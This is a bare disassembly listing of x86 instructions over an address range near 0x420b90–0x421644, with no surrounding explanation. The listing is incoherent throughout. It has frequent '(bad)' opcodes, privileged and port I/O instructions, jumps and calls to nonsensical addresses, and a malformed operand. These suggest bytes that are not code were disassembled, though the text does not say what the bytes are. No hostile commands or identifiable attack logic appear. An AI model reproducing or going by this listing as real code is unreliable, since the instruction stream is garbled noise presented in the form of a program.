  420b90:	aaa    
  420b91:	jo     0x420b87
  420b93:	dec    edi
  420b94:	(bad)  
  420b95:	neg    DWORD PTR [esi+0x2d]
  420b98:	stc    
  420b99:	sbb    BYTE PTR ds:0x221212c2,bh
  420b9f:	or     eax,0x2b20096f
  420ba4:	xor    DWORD PTR [esi-0x57],eax
  420ba7:	test   BYTE PTR [esi-0x41],cl
  420baa:	enter  0xccf4,0xf7
  420bae:	adc    DWORD PTR [edx],eax
  420bb0:	mov    ebx,0xa6996009
  420bb5:	scas   eax,DWORD PTR es:[edi]
  420bb6:	(bad)  
  420bb7:	pop    ecx
  420bb8:	sub    esp,DWORD PTR [ebx-0x42]
  420bbb:	sti    
  420bbc:	push   ss
  420bbd:	sbb    bh,al
  420bbf:	inc    edx
  420bc0:	mov    esp,DWORD PTR [ebx-0x7f]
  420bc3:	test   al,0xcd
  420bc5:	inc    ebx
  420bc6:	dec    ebp
  420bc7:	pop    ds
  420bc8:	or     DWORD PTR [edi+0x59],edx
  420bcb:	pusha  
  420bcc:	fwait
  420bcd:	mov    dh,BYTE PTR [edx-0x27906ebe]
  420bd3:	bound  ecx,QWORD PTR [edx+0x55db1edd]
  420bd9:	pop    esi
  420bda:	sahf   
  420bdb:	scas   eax,DWORD PTR es:[edi]
  420bdc:	push   edx
  420bdd:	push   cs
  420bde:	(bad)  
  420bdf:	imul   ebp,DWORD PTR [edx],0x30
  420be2:	jle    0x420bf1
  420be4:	cmp    BYTE PTR [edi],bl
  420be6:	pop    es
  420be7:	arpl   WORD PTR ds:0x6a67d71,bp
  420bed:	aas    
  420bee:	ret    0xba1e
  420bf1:	shr    BYTE PTR [esi],cl
  420bf3:	mov    esp,0xf76ac4e4
  420bf8:	push   esi
  420bf9:	nop
  420bfa:	repnz mov eax,ds:0xa9dccbfa
  420c00:	and    al,0x6c
  420c02:	call   0x646c97c7
  420c07:	xchg   esi,eax
  420c08:	cdq    
  420c09:	jne    0x420b8b
  420c0b:	add    al,0x69
  420c0d:	dec    esi
  420c0e:	mov    ds:0x381b12c7,al
  420c13:	call   0xf082cf9
  420c18:	mov    cl,0x35
  420c1a:	mov    cs,WORD PTR [ebx+0x14f8dd14]
  420c20:	jne    0x420ba5
  420c22:	call   0xf2de1d30
  420c27:	seta   BYTE PTR ss:[edx+0x33f1daef]
  420c2f:	mov    ah,0xad
  420c31:	icebp  
  420c32:	pop    ebp
  420c33:	xchg   ecx,eax
  420c34:	out    0x55,eax
  420c36:	test   al,0x3d
  420c38:	int3   
  420c39:	call   0x10dc9e32
  420c3e:	test   DWORD PTR [eax-0x744b52c1],esp
  420c44:	retf   
  420c45:	repnz iret 
  420c47:	xor    al,0x23
  420c49:	(bad)  
  420c4a:	shl    DWORD PTR [esi-0x62a758b9],1
  420c50:	das    
  420c51:	jmp    0xc8b22c90
  420c56:	fs jmp 0x418c:0x81c21968
  420c5e:	lds    ebp,FWORD PTR ds:0x96ce725c
  420c64:	pushf  
  420c65:	and    eax,0xd4978e77
  420c6a:	sbb    DWORD PTR [ecx],edi
  420c6c:	mov    cl,al
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0xf4
  420ce3:	data16 jecxz 0x420d21
  420ce6:	addr16 pusha 
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	xor    al,al
  420cf0:	bound  ebx,QWORD PTR [edx+0x3d4034e7]
  420cf6:	repz out dx,eax
  420cf8:	sbb    eax,0x5332dad4
  420cfd:	test   DWORD PTR [esi+0x66],esi
  420d00:	cmp    eax,0x669938a
  420d05:	shl    cl,1
  420d07:	(bad)  
  420d08:	aaa    
  420d09:	outs   dx,BYTE PTR ds:[esi]
  420d0a:	jecxz  0x420d59
  420d0c:	xor    DWORD PTR [eax],esp
  420d0e:	mov    ebp,0xa1bd3286
  420d13:	mov    esp,0x838c4ed1
  420d18:	popf   
  420d19:	or     al,0xcc
  420d1b:	test   BYTE PTR [ecx+0x1d],0x66
  420d1f:	retf   0x9582
  420d22:	sub    ecx,0x22e96e5f
  420d28:	sbb    cl,cl
  420d2a:	push   es
  420d2b:	adc    eax,0x80256855
  420d30:	ficomp WORD PTR [edi]
  420d32:	std    
  420d33:	jno    0x420cbc
  420d35:	cmp    DWORD PTR [ebx+0x441a71a6],ecx
  420d3b:	sub    DWORD PTR [ebx-0x75c5166],edx
  420d41:	into   
  420d42:	cmc    
  420d43:	sbb    ah,al
  420d45:	mov    ebx,0xd6bb8f2d
  420d4a:	loope  0x420d21
  420d4c:	(bad)  [ecx+edx*8]
  420d4f:	jmp    0x9f5f7529
  420d54:	adc    BYTE PTR [ebp+0xd51a3ce],al
  420d5a:	and    eax,0x6e03546e
  420d5f:	mov    esp,0xa2b8f5e8
  420d64:	scas   eax,DWORD PTR es:[edi]
  420d65:	xchg   esi,eax
  420d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d67:	jmp    0x35e09116
  420d6c:	ret    
  420d6d:	int    0x6f
  420d6f:	test   eax,0x1c78ec3d
  420d74:	xchg   ebx,eax
  420d75:	add    ebx,edi
  420d77:	outs   dx,BYTE PTR ds:[esi]
  420d78:	in     al,dx
  420d79:	mov    bh,0x62
  420d7b:	jecxz  0x420dc6
  420d7d:	push   esi
  420d7e:	push   ecx
  420d7f:	xchg   esi,eax
  420d80:	into   
  420d81:	jle    0x420df9
  420d83:	mov    dl,0x75
  420d85:	xchg   edi,eax
  420d86:	jo     0x420daa
  420d88:	test   BYTE PTR [edi+0x74],0xfb
  420d8c:	xchg   edx,eax
  420d8d:	stos   BYTE PTR es:[edi],al
  420d8e:	mov    edx,0xd0f9db64
  420d93:	outs   dx,DWORD PTR ds:[esi]
  420d94:	sbb    DWORD PTR [ebp+0x67],ebp
  420d97:	std    
  420d98:	mov    bl,0x9f
  420d9a:	sub    DWORD PTR [ebx],ecx
  420d9c:	outs   dx,BYTE PTR ds:[esi]
  420d9d:	add    ch,ch
  420d9f:	(bad)  
  420da1:	fld    DWORD PTR [esi]
  420da3:	mov    ebp,0xc0e30ba3
  420da8:	mov    eax,ds:0xc25596ef
  420dad:	repz sub bx,WORD PTR [ebx]
  420db1:	fimul  WORD PTR [ebx]
  420db3:	sbb    ebx,DWORD PTR [edx-0x31a3f1f]
  420db9:	fwait
  420dba:	add    al,0x12
  420dbc:	jmp    FWORD PTR ds:0xabb69ddc
  420dc2:	adc    ecx,esp
  420dc4:	inc    ecx
  420dc5:	inc    edx
  420dc6:	mov    WORD PTR [edi+0x4ac74dcb],gs
  420dcc:	popf   
  420dcd:	xchg   ebx,eax
  420dce:	fnstenv [esi+0xf]
  420dd1:	cmp    eax,0x1565cfb5
  420dd6:	add    edx,0xad7cb1e8
  420ddc:	rcl    BYTE PTR [eax],1
  420dde:	dec    edx
  420ddf:	daa    
  420de0:	cmp    al,0x10
  420de2:	mov    cl,BYTE PTR [edi+esi*8]
  420de5:	ficomp DWORD PTR [ecx-0x26]
  420de8:	push   ebp
  420de9:	inc    esp
  420dea:	xor    DWORD PTR [edi+0x27],ebp
  420ded:	mov    dl,0x0
	...
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xbdb54878
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	shl    DWORD PTR [edx],0x72
  420e71:	in     eax,dx
  420e72:	or     edx,DWORD PTR [edi+ebp*4]
  420e75:	mov    bh,0x5e
  420e77:	loope  0x420e23
  420e79:	fst    QWORD PTR [ebp+0x73]
  420e7c:	inc    edi
  420e7d:	and    DWORD PTR [ecx-0x7aa85bd4],0x90d8852b
  420e87:	inc    edi
  420e88:	iret   
  420e89:	adc    DWORD PTR [edi-0x1a64539a],esp
  420e8f:	or     esi,esp
  420e91:	cmp    edi,ecx
  420e93:	arpl   sp,cx
  420e95:	push   edi
  420e96:	inc    edx
  420e97:	xor    al,bh
  420e99:	jmp    0xa2a8af8b
  420e9e:	add    BYTE PTR [ecx],0xde
  420ea1:	pop    edx
  420ea2:	data16 mov cl,0x12
  420ea5:	inc    esi
  420ea6:	retf   
  420ea7:	scas   eax,DWORD PTR es:[edi]
  420ea8:	ror    BYTE PTR [edi],cl
  420eaa:	jo     0x420ea5
  420eac:	les    esi,FWORD PTR [esi+0x412dc686]
  420eb2:	jno    0x420e9a
  420eb4:	loope  0x420e75
  420eb6:	mov    bh,0xfb
  420eb8:	push   edx
  420eb9:	sub    BYTE PTR [esi+0x7a],dh
  420ebc:	xor    BYTE PTR [edx+0x48160fc2],cl
  420ec2:	gs cld 
  420ec4:	cdq    
  420ec5:	or     ebx,DWORD PTR [ebx+ebx*4+0x98853de]
  420ecc:	cs enter 0x85ef,0xe6
  420ed1:	inc    edx
  420ed2:	push   ebx
  420ed3:	push   0x2
  420ed5:	dec    edx
  420ed6:	sub    DWORD PTR gs:[edx+0x20c1793b],ebx
  420edd:	pop    ecx
  420ede:	and    DWORD PTR [esi+0x38c9ca44],0xd
  420ee5:	gs (bad) 
  420ee7:	push   ss
  420ee8:	imul   ebp,DWORD PTR ds:0x5345f1cd,0x58852d74
  420ef2:	and    cl,BYTE PTR [ecx-0x79129057]
  420ef8:	mov    dl,0xa5
  420efa:	aaa    
  420efb:	mov    eax,?
  420efd:	push   ecx
  420efe:	pop    edx
  420eff:	pop    ss
  420f00:	mov    edi,0x339a495b
  420f05:	xor    DWORD PTR [ecx],esi
  420f07:	jecxz  0x420ef9
  420f09:	add    DWORD PTR [esi-0xf],ebp
  420f0c:	ds push esp
  420f0e:	pop    ebp
  420f0f:	mov    esi,0xaafcd55c
  420f14:	jnp    0x420f1b
  420f16:	sub    eax,eax
  420f18:	ror    DWORD PTR [edi+edi*1+0x14b0e992],1
  420f1f:	sub    BYTE PTR [ecx],0xbd
  420f22:	pop    eax
  420f23:	fadd   DWORD PTR [esi-0x7]
  420f26:	out    dx,al
  420f27:	mov    BYTE PTR [edi+0x1b],al
  420f2a:	pop    edx
  420f2b:	pop    es
  420f2c:	lock mov dh,0xa5
  420f2f:	lods   al,BYTE PTR ds:[esi]
  420f30:	sub    BYTE PTR [esi-0x421a173f],ah
  420f36:	and    ecx,DWORD PTR [eax+0x72]
  420f39:	and    eax,0xcfce9626
  420f3e:	shl    bl,1
  420f40:	and    al,0xcc
  420f42:	cwde   
  420f43:	repz call 0x8af2556f
  420f49:	sub    bl,BYTE PTR [ebp+0x24db7799]
  420f4f:	hlt    
  420f50:	lahf   
  420f51:	test   al,0xf8
  420f53:	out    dx,al
  420f54:	jp     0x420f8b
  420f56:	pop    ss
  420f57:	popf   
  420f58:	idiv   DWORD PTR [ebp-0x11]
  420f5b:	jmp    0xc4f6:0x1ddba139
  420f62:	jg     0x420f02
  420f64:	push   0xffffff8d
  420f66:	mov    eax,ds:0xfcf9c574
  420f6b:	dec    ecx
  420f6c:	cmp    ebx,0x0
	...
  420fd3:	add    BYTE PTR [eax],al
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x6924ecd0]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [eax],bh
  420fef:	mov    eax,ds:0x9fee4a8c
  420ff4:	mov    fs,eax
  420ff6:	pop    ebp
  420ff7:	fdiv   DWORD PTR [esi+eax*2-0x67]
  420ffb:	mov    edx,0x8ec10610
  421000:	xor    eax,0x61
  421003:	test   BYTE PTR [edi+0x73f594a1],dh
  421009:	jbe    0x42102b
  42100b:	in     al,0xcc
  42100d:	pop    ds
  42100e:	dec    ebp
  42100f:	ret    
  421010:	loopne 0x42108f
  421012:	xor    eax,0xc850e63e
  421017:	mov    ebx,0xa5268184
  42101c:	fiadd  WORD PTR [edx+eiz*2-0x3e6f5fa5]
  421023:	jb     0x420fd6
  421025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421026:	sbb    BYTE PTR [edi*2-0x40587295],dl
  42102d:	fiadd  WORD PTR [edi]
  42102f:	test   ebp,esp
  421031:	or     BYTE PTR [ebp+0x6e],0xb0
  421035:	jg     0x420fc3
  421037:	push   esi
  421038:	je     0x42108b
  42103a:	clc    
  42103b:	mov    DWORD PTR [esi+0x62f4d97c],eax
  421041:	ins    BYTE PTR es:[edi],dx
  421042:	in     ax,dx
  421044:	in     al,0xab
  421046:	cmp    BYTE PTR [ebp+0x75],ah
  421049:	imul   ecx,DWORD PTR [edi-0xed34c70],0xffffffcf
  421050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421051:	les    eax,FWORD PTR [edi+edi*8+0x57]
  421055:	pop    esi
  421056:	outs   dx,DWORD PTR ds:[esi]
  421057:	jl     0x421068
  421059:	ss gs push ecx
  42105c:	loope  0x42107a
  42105e:	cmp    ecx,DWORD PTR [edx+0x128e570b]
  421064:	pop    ebx
  421065:	ffree  st(5)
  421067:	ja     0x4210e4
  421069:	jb     0x421005
  42106b:	jbe    0x42102b
  42106d:	pop    ebp
  42106e:	inc    esp
  42106f:	mov    ds:0x46d222dc,al
  421074:	shl    DWORD PTR [ecx-0x5b],cl
  421077:	xor    ebx,DWORD PTR [edi-0x12c1459c]
  42107d:	mov    DWORD PTR [edx+0xf],edi
  421080:	je     0x4210a7
  421082:	in     al,0x2b
  421084:	fidiv  DWORD PTR [ecx+0x23]
  421087:	ficomp WORD PTR [ebx-0x57]
  42108a:	(bad)  
  42108b:	xor    DWORD PTR [ebx],ebp
  42108d:	imul   eax,DWORD PTR [edx],0xffffff8a
  421090:	ss mov al,fs:0x5f7a3bf7
  421097:	push   es
  421098:	sub    edi,DWORD PTR [ebp+0x10]
  42109b:	je     0xc6c8e89e
  4210a1:	push   esi
  4210a2:	out    dx,al
  4210a3:	mov    bh,0x22
  4210a5:	(bad)  
  4210a6:	sub    al,0x5d
  4210a8:	shl    dl,0xc2
  4210ab:	cs inc edx
  4210ad:	pop    edx
  4210ae:	cld    
  4210af:	sbb    bh,BYTE PTR [ecx]
  4210b1:	(bad)  
  4210b2:	sub    DWORD PTR [edi-0x303e7dc3],esi
  4210b8:	jmp    0x9c28:0x7c9f7dec
  4210bf:	mov    bl,BYTE PTR [edi+0x58ccdf3c]
  4210c5:	jecxz  0x421069
  4210c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210c8:	dec    ecx
  4210c9:	ss pop ecx
  4210cb:	mov    DWORD PTR [edi],edi
  4210cd:	retf   
  4210ce:	(bad)  
  4210cf:	xor    eax,0xe247cef4
  4210d4:	in     eax,0x48
  4210d6:	mov    eax,0x31cebd89
  4210db:	xor    DWORD PTR [ebp-0x5f],ebp
  4210de:	(bad)  
  4210df:	mov    ecx,eax
  4210e1:	ret    
  4210e2:	jne    0x4210e9
  4210e4:	sbb    al,0x90
  4210e6:	call   0x6a2d:0x44f0ed59
  4210ed:	or     BYTE PTR [eax],al
	...
  421153:	add    BYTE PTR [eax],al
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ds,esp
  421163:	sbb    DWORD PTR [edx-0x10],0x16367
  42116a:	add    BYTE PTR [ecx],al
  42116c:	add    BYTE PTR [eax],al
  42116e:	mov    bl,0xfb
  421170:	jmp    0x421190
  421172:	cmc    
  421173:	dec    ecx
  421174:	xor    dh,BYTE PTR [eax]
  421176:	push   esp
  421177:	mov    esp,0x2b88889c
  42117c:	js     0x421148
  42117e:	add    BYTE PTR [ecx-0xf],ch
  421181:	fcomi  st,st(5)
  421183:	jbe    0x4211a4
  421185:	cmp    al,0xec
  421187:	out    0x17,eax
  421189:	adc    BYTE PTR [esi-0x3067b6dd],dl
  42118f:	push   edx
  421190:	pushf  
  421191:	imul   eax,DWORD PTR [ebx],0xffffffaa
  421194:	imul   esi,DWORD PTR [ecx],0x3788f76f
  42119a:	mov    ebx,0xe37213c3
  42119f:	shl    edi,0x59
  4211a2:	mov    esp,0xdc7a15fc
  4211a7:	mov    al,ds:0x8f4240e5
  4211ac:	fcom   QWORD PTR [eax]
  4211ae:	fistp  QWORD PTR [ecx+ebp*1+0x2b]
  4211b2:	cmp    eax,0x4d198372
  4211b7:	jbe    0x42121a
  4211b9:	mov    ecx,0x50ebca27
  4211be:	cmc    
  4211bf:	add    BYTE PTR [eax-0xd],cl
  4211c2:	into   
  4211c3:	outs   dx,BYTE PTR ds:[esi]
  4211c4:	div    BYTE PTR [esi+ebx*4+0x2ef5a39]
  4211cb:	inc    esp
  4211cc:	dec    BYTE PTR [ebp-0x50109b76]
  4211d2:	outs   dx,BYTE PTR ds:[esi]
  4211d3:	jecxz  0x421211
  4211d5:	dec    edi
  4211d6:	pop    esp
  4211d7:	push   edi
  4211d8:	mov    WORD PTR [ebx],gs
  4211da:	and    BYTE PTR [ebx-0x7516d58a],bh
  4211e0:	out    dx,eax
  4211e1:	push   0xfd964edb
  4211e6:	ds pop esp
  4211e8:	xchg   esp,eax
  4211e9:	adc    eax,0xb8f06f73
  4211ee:	sub    BYTE PTR [edx+0x51],cl
  4211f1:	pusha  
  4211f2:	clc    
  4211f3:	mov    ebp,0xe0ccd74c
  4211f8:	(bad)  
  4211f9:	jb     0x42118c
  4211fb:	pushf  
  4211fc:	push   0xd
  4211fe:	out    0x3a,al
  421200:	fadd   DWORD PTR [esi-0x4e]
  421203:	iret   
  421204:	mov    ebp,0xdfc57454
  421209:	mov    eax,edi
  42120b:	or     DWORD PTR [edi+0x67b370d2],esp
  421211:	mov    edx,0xccd74b3c
  421216:	jmp    0xd159:0xf689b3c9
  42121d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42121e:	mov    bl,0xe7
  421220:	jno    0x421240
  421222:	outs   dx,BYTE PTR ds:[esi]
  421223:	repz aas 
  421225:	jnp    0x421245
  421227:	loope  0x4212a2
  421229:	inc    eax
  42122a:	adc    esp,eax
  42122c:	sbb    al,0x2c
  42122e:	(bad)
  421231:	dec    eax
  421232:	inc    ecx
  421233:	mov    DWORD PTR fs:[esi+0x4f],esp
  421237:	pop    edx
  421238:	je     0x421211
  42123a:	outs   dx,BYTE PTR ds:[esi]
  42123b:	sub    eax,0x31be2590
  421240:	mov    edi,0x25d7dd2f
  421245:	into   
  421246:	jle    0x42129e
  421248:	and    bh,ah
  42124a:	xchg   ebp,eax
  42124b:	push   cs
  42124c:	out    0xc9,al
  42124e:	mov    dl,BYTE PTR [ebx-0x38634a]
  421254:	lds    ecx,FWORD PTR [edx+0xc9ce4e6]
  42125a:	mov    ds:0x7f9a3519,eax
  42125f:	es cmp al,bl
  421262:	mov    eax,ds:0x455a0d35
  421267:	fcomp  QWORD PTR [eax+0x49]
  42126a:	mov    ah,0x91
  42126c:	ror    cl,cl
	...
  4212d6:	sahf   
  4212d7:	pop    ds
  4212d8:	(bad)  
  4212d9:	test   DWORD PTR [edi-0x42800109],0x67ab32d
  4212e3:	(bad)  
  4212e4:	mov    edx,0x1646760
  4212e9:	add    BYTE PTR [eax],al
  4212eb:	add    DWORD PTR [eax],eax
  4212ed:	add    BYTE PTR [eax+0x28f10b22],ch
  4212f3:	(bad)  
  4212f4:	cmp    eax,0x79d4874c
  4212f9:	push   es
  4212fa:	push   edi
  4212fb:	ds or  ebx,0x1f83f954
  421302:	ins    DWORD PTR es:[edi],dx
  421303:	dec    ecx
  421304:	in     al,dx
  421305:	inc    esi
  421306:	int3   
  421307:	lods   al,BYTE PTR ds:[esi]
  421308:	retf   0x8d34
  42130b:	(bad)  
  42130c:	aas    
  42130d:	dec    esi
  42130e:	pop    ebx
  42130f:	and    ah,ah
  421311:	repz mov al,ds:0x5055bbf2
  421317:	xor    al,0x20
  421319:	fstp   TBYTE PTR [edx+esi*8-0x53bc9df4]
  421320:	in     eax,dx
  421321:	adc    bl,BYTE PTR [ebp-0xd]
  421324:	inc    ecx
  421325:	sbb    eax,0xe74a438e
  42132a:	mov    bh,0xef
  42132c:	push   ss
  42132d:	push   esi
  42132e:	add    DWORD PTR [ebp+0x4c],edi
  421331:	jecxz  0x4212c7
  421333:	int    0x11
  421335:	ins    DWORD PTR es:[edi],dx
  421336:	add    eax,0x29cbd480
  42133b:	loopne 0x4213ae
  42133d:	dec    edx
  42133e:	jnp    0x4213b9
  421340:	js     0x4212c8
  421342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421344:	imul   edx,ecx,0xffffff87
  421347:	shl    BYTE PTR [esi+0x28],cl
  42134a:	jecxz  0x4212fa
  42134c:	sar    BYTE PTR [eax+eiz*2+0x12c28ee7],cl
  421353:	stos   DWORD PTR es:[edi],eax
  421354:	or     DWORD PTR [ebp+0x75c559c8],edi
  42135a:	(bad)  
  42135b:	out    dx,al
  42135c:	mov    dh,0xda
  42135e:	add    esi,DWORD PTR [esi-0x1c]
  421361:	mov    esi,0x61f9bae9
  421366:	scas   al,BYTE PTR es:[edi]
  421367:	(bad)  
  421368:	out    dx,eax
  421369:	jo     0x4213e4
  42136b:	adc    BYTE PTR [esi+0x15],ah
  42136e:	cmp    eax,0x2a376b35
  421373:	mov    al,ds:0x379d3137
  421378:	js     0x42132f
  42137a:	cmc    
  42137b:	lds    ebx,FWORD PTR [ebp+0x4787fd8]
  421381:	mov    edi,0x94f585aa
  421386:	ds mov dh,0x5e
  421389:	(bad)  
  42138a:	mov    al,ds:0x1ce7a915
  42138f:	jmp    0x553a7beb
  421394:	fnstsw WORD PTR [ebx+ebp*1-0x5ddc3871]
  42139b:	inc    edi
  42139c:	inc    edi
  42139d:	(bad)  
  42139e:	or     DWORD PTR [ecx-0x54705ef1],edx
  4213a4:	leave  
  4213a5:	sbb    al,0xd3
  4213a7:	pop    esp
  4213a8:	push   esi
  4213a9:	imul   ecx,DWORD PTR [edi+0x40],0xffffffca
  4213ad:	(bad)  
  4213ae:	dec    ecx
  4213af:	out    0x3b,al
  4213b1:	stos   BYTE PTR es:[edi],al
  4213b2:	leave  
  4213b3:	in     al,dx
  4213b4:	mov    ds:0xddd481da,al
  4213b9:	cmp    al,0x23
  4213bb:	fist   DWORD PTR [edi-0x1a837bd5]
  4213c1:	mov    WORD PTR [ecx-0x4ae58f92],gs
  4213c7:	ja     0x4213bc
  4213c9:	int    0x1f
  4213cb:	outs   dx,BYTE PTR ds:[esi]
  4213cc:	cmp    DWORD PTR [eax-0x1f],eax
  4213cf:	jbe    0x421390
  4213d1:	int    0xdb
  4213d3:	jle    0x421377
  4213d5:	jecxz  0x4213d2
  4213d7:	jmp    0x4213f7
  4213d9:	pop    esp
  4213da:	sbb    esp,DWORD PTR [ebp-0x6fb8f443]
  4213e0:	pop    esp
  4213e1:	cwde   
  4213e2:	dec    ax
  4213e4:	das    
  4213e5:	aaa    
  4213e6:	pop    ss
  4213e7:	sub    ebx,DWORD PTR [edx]
  4213e9:	shl    DWORD PTR [ebp+0x13],0xbc
  4213ed:	inc    ecx
	...
  421456:	inc    bh
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x5d83f49f]
  421464:	das    
  421465:	jb     0x4214ce
  421467:	add    DWORD PTR gs:[eax],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	mov    ds:0x30138a0a,al
  421473:	jmp    DWORD PTR [edx+0x5c1fd3d4]
  421479:	ins    BYTE PTR es:[edi],dx
  42147a:	pop    DWORD PTR [eax]
  42147c:	ror    BYTE PTR ss:[ecx-0x3e],cl
  421480:	aad    0xfd
  421482:	dec    esp
  421483:	aaa    
  421484:	jmp    0xbe07:0xa91da443
  42148b:	outs   dx,BYTE PTR ds:[esi]
  42148c:	mov    bh,0x96
  42148e:	fcomp  st(6)
  421490:	jmp    0x421501
  421492:	into   
  421493:	rol    BYTE PTR [eax-0x34],cl
  421496:	call   0x25a8:0x5188860a
  42149d:	sub    BYTE PTR [ebx+0x5],0xcc
  4214a1:	hlt    
  4214a2:	pop    ss
  4214a3:	sbb    DWORD PTR ds:0x44cbaeea,ebx
  4214a9:	imul   ebx,eax,0xffffffc2
  4214ac:	or     al,0x6f
  4214ae:	sub    BYTE PTR [ebp+0x7bb29ab5],dh
  4214b4:	(bad)  
  4214b6:	xchg   edi,eax
  4214b7:	bound  ebp,QWORD PTR [eax+0x19]
  4214ba:	loop   0x421449
  4214bc:	push   esi
  4214bd:	out    dx,eax
  4214be:	stc    
  4214bf:	sub    dh,BYTE PTR [ebp+0x54]
  4214c2:	xor    dh,BYTE PTR [esi]
  4214c4:	mov    DWORD PTR [ecx+ebx*4+0x49],edx
  4214c8:	rcl    BYTE PTR [esi-0x3049ef4c],cl
  4214ce:	add    DWORD PTR [ebx],edx
  4214d0:	jne    0x4214cc
  4214d2:	pop    es
  4214d3:	mov    al,ds:0xd2cc86e8
  4214d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214d9:	adc    eax,0x51818371
  4214de:	cwde   
  4214df:	xchg   edi,eax
  4214e0:	sub    eax,0x90b20277
  4214e5:	imul   edi,DWORD PTR [esi-0x25b33220],0x1885e102
  4214ef:	clc    
  4214f0:	outs   dx,BYTE PTR ds:[esi]
  4214f1:	cmp    ah,0x9e
  4214f4:	sub    DWORD PTR [edi+0x348d6ae4],edi
  4214fa:	push   0xffffffd6
  4214fc:	ja     0x421502
  4214fe:	inc    ebx
  4214ff:	loop   0x4214bc
  421501:	popf   
  421502:	fstp   st(2)
  421504:	daa    
  421505:	test   DWORD PTR [edx],esi
  421507:	mov    bl,0x81
  421509:	cmp    dl,BYTE PTR [eax-0x192e20ce]
  42150f:	mov    ds:0x72af8be9,eax
  421514:	fiadd  WORD PTR [ebx]
  421516:	xchg   ebp,eax
  421517:	and    al,0xe1
  421519:	adc    BYTE PTR [esi-0x3],0x6
  42151d:	ja     0x4214d9
  42151f:	mov    ds:0xe470842,al
  421524:	mov    ds:0x317e9cdd,eax
  421529:	adc    BYTE PTR [esi],0xbe
  42152c:	push   ebp
  42152d:	jg     0x4214b8
  42152f:	xlat   BYTE PTR ds:[ebx]
  421530:	xor    DWORD PTR [edx],edx
  421532:	pop    ecx
  421533:	imul   ecx,ecx,0xffffff96
  421536:	adc    edi,DWORD PTR [eax+0x62]
  421539:	mov    BYTE PTR [esp+ebp*1+0x42b03ab0],cl
  421540:	cs xchg esi,eax
  421542:	lods   al,BYTE PTR ds:[esi]
  421543:	scas   eax,DWORD PTR es:[edi]
  421544:	in     al,dx
  421545:	push   ebx
  421546:	daa    
  421547:	sbb    BYTE PTR [ebx-0x4475c95d],ch
  42154d:	pop    ebp
  42154e:	inc    ebp
  42154f:	mov    edx,DWORD PTR [ecx-0x6a]
  421552:	mov    ebx,0xf3553a68
  421557:	in     eax,dx
  421558:	pop    ecx
  421559:	mov    al,ds:0xd7f208bd
  42155e:	or     BYTE PTR [edx],bh
  421560:	inc    esi
  421561:	lds    eax,FWORD PTR [ecx-0x46]
  421564:	xor    dl,bh
  421566:	adc    BYTE PTR [ecx],dl
  421568:	ret    0x794a
  42156b:	xor    ebx,DWORD PTR ds:0xe
	...
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x458342b4],bp
  4215e4:	pop    esp
  4215e5:	imul   esp,DWORD PTR [edi+0x66],0x1
  4215e9:	add    BYTE PTR [eax],al
  4215eb:	add    DWORD PTR [eax],eax
  4215ed:	add    BYTE PTR ds:0x4b53f464,dh
  4215f3:	mov    esp,0x234d6c8f
  4215f8:	sub    al,0x6
  4215fa:	jnp    0x421586
  4215fc:	inc    edx
  4215fd:	jnp    0x42162a
  4215ff:	and    al,0x0
  421601:	aas    
  421602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421603:	mov    DWORD PTR [edi+0x25eec60f],ebx
  421609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42160a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42160b:	es cmp al,0x41
  42160e:	jmp    0x3400863a
  421613:	pop    ebp
  421614:	cli    
  421615:	push   esp
  421616:	(bad)
  421619:	das    
  42161a:	test   edx,esp
  42161c:	or     ebp,edi
  42161e:	addr16 enter 0x13dc,0x39
  421623:	arpl   WORD PTR fs:0x505675cf,bx
  42162a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42162b:	mov    ecx,DWORD PTR [ecx]
  42162d:	push   esp
  42162e:	or     cl,0xf
  421631:	in     al,dx
  421632:	inc    esi
  421633:	aam    0x9e
  421635:	bound  ebx,QWORD PTR [ebx+0x28]
  421638:	add    edx,0x40b7731b
  42163e:	dec    edi
  42163f:	arpl   WORD PTR [edx-0x62],sp
  421642:	out    dx,eax
  421643:	daa    
  421644:	imul   esp,DWORD PTR [ebp-0x7b],0x5581e52d
